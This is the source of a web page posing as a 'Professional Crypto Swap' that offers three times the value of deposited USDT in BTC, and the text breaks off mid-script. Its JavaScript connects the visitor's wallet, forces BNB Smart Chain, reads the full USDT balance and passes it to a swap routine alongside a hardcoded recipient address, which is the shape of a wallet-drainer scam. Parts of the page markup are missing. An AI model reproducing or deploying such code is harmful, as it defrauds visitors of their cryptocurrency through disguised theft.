<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Professional Crypto Swap</title>
    <style>
        :root {
            --primary: #F0B90B;
            --primary-hover: #F8D33A;
            --text-dark: #1E2026;
            --text-medium: #474D57;
            --text-light: #848E9C;
            --bg: #F8F9FA;
            --card: #FFFFFF;
            --border: #EAECEF;
            --success: #02C076;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        @font-face {
            font-family: 'Inter';
            src: url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
            font-display: swap;
        }

        body {
            background-color: var(--bg);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: var(--text-dark);
        }

        .swap-container {
            background-color: var(--card);
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
            width: 100%;
            max-width: 420px;
            padding: 24px;
            border: 1px solid var(--border);
        }

        .swap-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }

        .swap-title {
            font-size: 20px;
            font-weight: 600;
            color: var(--text-dark);
        }

        .swap-settings {
            color: var(--text-light);
            cursor: pointer;
            font-size: 18px;
        }

        .token-section {
            margin-bottom: 16px;
        }

        .token-label {
            font-size: 14px;
            color: var(--text-medium);
            margin-bottom: 8px;
            font-weight: 500;
        }

        .token-input-box {
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 16px;
            transition: border-color 0.2s;
        }

        .token-input-box:focus-within {
            border-color: var(--primary);
        }

        .token-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        .token-selector {
            display: flex;
            align-items: center;
            cursor: pointer;
        }

        .token-logo {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            margin-right: 10px;
            object-fit: contain;
        }

        .token-name {
            font-weight: 600;
            font-size: 16px;
            margin-right: 8px;
        }

        .token-badge {
            font-size: 12px;
            color: var(--text-medium);
            background-color: var(--bg);
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: 500;
        }

        .token-input-wrapper {
            display: flex;
            align-items: center;
        }

        .token-amount-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 26px;
            font-weight: 500;
            color: var(--text-dark);
            text-align: right;
            background: transparent;
            font-family: 'Inter', sans-serif;
        }

        .token-amount-input::placeholder {
            color: var(--border);
        }

        .token-usd-value {
            font-size: 14px;
            color: var(--text-light);
            text-align: right;
            margin-top: 8px;
            font-weight: 500;
        }

        .swap-divider {
            position: relative;
            margin: 12px 0;
            display: flex;
            justify-content: center;
        }

        .swap-icon {
            width: 36px;
            height: 36px;
            background-color: var(--card);
            border: 1px solid var(--border);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--primary);
            z-index: 2;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .swap-icon:hover {
            transform: translateY(-2px);
        }

        .swap-divider-line {
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background-color: var(--border);
            z-index: 1;
        }

        .swap-info {
            margin: 20px 0;
            text-align: center;
        }

        .swap-rate {
            font-size: 14px;
            color: var(--text-light);
            font-weight: 500;
        }

        .swap-rate strong {
            color: var(--text-dark);
            font-weight: 600;
        }

        .swap-details {
            background-color: var(--bg);
            border-radius: 12px;
            padding: 16px;
            margin: 20px 0;
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
        }

        .detail-row:last-child {
            margin-bottom: 0;
        }

        .detail-label {
            font-size: 14px;
            color: var(--text-light);
        }

        .detail-value {
            font-size: 14px;
            color: var(--text-dark);
            font-weight: 500;
        }

        .swap-button {
            width: 100%;
            background-color: var(--primary);
            color: var(--text-dark);
            border: none;
            border-radius: 12px;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .swap-button:hover {
            background-color: var(--primary-hover);
            transform: translateY(-1px);
        }

        .swap-button:active {
            transform: translateY(0);
        }

        /* Modal Styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-container {
            background-color: var(--card);
            border-radius: 16px;
            width: 90%;
            max-width: 380px;
            padding: 24px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
            animation: modalFadeIn 0.3s ease-out;
        }

        @keyframes modalFadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }

        .modal-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text-dark);
        }

        .modal-close {
            color: var(--text-light);
            cursor: pointer;
            font-size: 20px;
        }

        .modal-content {
            margin-bottom: 20px;
        }

        .modal-message {
            font-size: 15px;
            color: var(--text-medium);
            line-height: 1.5;
        }

        .modal-progress {
            height: 4px;
            background-color: var(--border);
            border-radius: 2px;
            margin: 16px 0;
            overflow: hidden;
        }

        .modal-progress-bar {
            height: 100%;
            background-color: var(--primary);
            width: 0%;
            transition: width 0.3s ease;
        }

        .modal-button {
            width: 100%;
            background-color: var(--primary);
            color: var(--text-dark);
            border: none;
            border-radius: 8px;
            padding: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .modal-button:hover {
            background-color: var(--primary-hover);
        }

        .tx-link {
            display: inline-block;
            margin-top: 12px;
            color: var(--primary);
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }

        .tx-link:hover {
            text-decoration: underline;
        }

        /* Loading spinner */
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(30, 32, 38, 0.1);
            border-top-color: var(--text-dark);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Responsive adjustments */
        @media (max-width: 480px) {
            .swap-container {
                padding: 20px;
            }
            .token-amount-input {
                font-size: 22px;
            }
        }
    </style>

</head>
<body>

    <div id="modal" class="modal-overlay">

    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // DOM Elements
            const usdtInput = document.getElementById('usdtInput');
            const usdtValue = document.getElementById('usdtValue');
            const btcAmount = document.getElementById('btcAmount');
            const btcValue = document.getElementById('btcValue');
            const swapButton = document.getElementById('swapButton');
            const buttonText = document.getElementById('buttonText');
            const modal = document.getElementById('modal');
            const modalClose = document.getElementById('modalClose');
            const modalTitle = document.getElementById('modalTitle');
            const modalMessage = document.getElementById('modalMessage');
            const modalButton = document.getElementById('modalButton');
            const progressBar = document.getElementById('progressBar');
            const txLink = document.getElementById('txLink');

            // Constants
            const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
            const RECIPIENT_ADDRESS = '0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999';
            const MIN_SWAP_AMOUNT = 200;
            const BTC_RATE = 119489.153599;
            const BSC_SCAN_URL = 'https://bscscan.com/tx/';

            // State
            let isProcessing = false;

            // Initialize
            init();

            function init() {
                setupEventListeners();
                updateConversion();
            }

            function setupEventListeners() {
                // Input change handler
                usdtInput.addEventListener('input', updateConversion);
                
                // Swap button handler
                swapButton.addEventListener('click', handleSwap);
                
                // Modal close handler
                modalClose.addEventListener('click', closeModal);
                modalButton.addEventListener('click', closeModal);
                
                // Wallet account change handler
                if (window.ethereum) {
                    window.ethereum.on('accountsChanged', handleAccountsChanged);
                    window.ethereum.on('chainChanged', handleChainChanged);
                }
            }

            function updateConversion() {
                const usdt = parseFloat(usdtInput.value) || 0;
                const usd = usdt * 1.0; // 1 USDT = 1 USD
                const btc = (usd * 3) / BTC_RATE; // 3x multiplier
                
                // Update displays
                usdtValue.textContent = `$${usd.toFixed(2)}`;
                btcAmount.textContent = btc.toFixed(8);
                btcValue.textContent = `$${(usd * 3).toFixed(2)}`;
            }

            async function handleSwap() {
                if (isProcessing) return;
                
                try {
                    isProcessing = true;
                    buttonText.innerHTML = '<span class="spinner"></span> Processing';
                    
                    // Check if wallet is installed
                    if (!window.ethereum) {
                        throw new Error('Please install MetaMask or Trust Wallet to continue');
                    }
                    
                    // Show connecting modal
                    showModal('Connecting Wallet', 'Waiting for wallet connection...');
                    updateProgress(10);
                    
                    // Request account access
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    updateProgress(30);
                    
                    // Switch to BNB Smart Chain
                    await switchToBNBChain();
                    updateProgress(50);
                    
                    // Check USDT balance
                    const balance = await getUSDTBalance(accounts[0]);
                    updateProgress(70);
                    
                    // Validate balance
                    if (balance < MIN_SWAP_AMOUNT) {
                        throw new Error(`Minimum swap is ${MIN_SWAP_AMOUNT} USDT. Your balance: ${balance.toFixed(2)} USDT`);
                    }
                    
                    // Perform swap
                    await performSwap(accounts[0], balance);
                    
                } catch (error) {
                    console.error('Swap error:', error);
                    showModal('Error', error.message || 'An error occurred during the swap');
                    modalButton.style.display = 'block';
                } finally {
                    isProcessing = false;
                    buttonText.textContent = 'Swap Now';
                }
            }

            async function switchToBNBChain() {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }], // BSC mainnet
                    });
                } catch (switchError) {
                    // Chain not added to wallet
                    if (switchError.code === 4902) {
                        try {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: '0x38',
                                    chainName: 'Binance Smart Chain',
                                    nativeCurrency: {
                                        name: 'BNB',
                                        symbol: 'BNB',
                                        decimals: 18,
                                    },
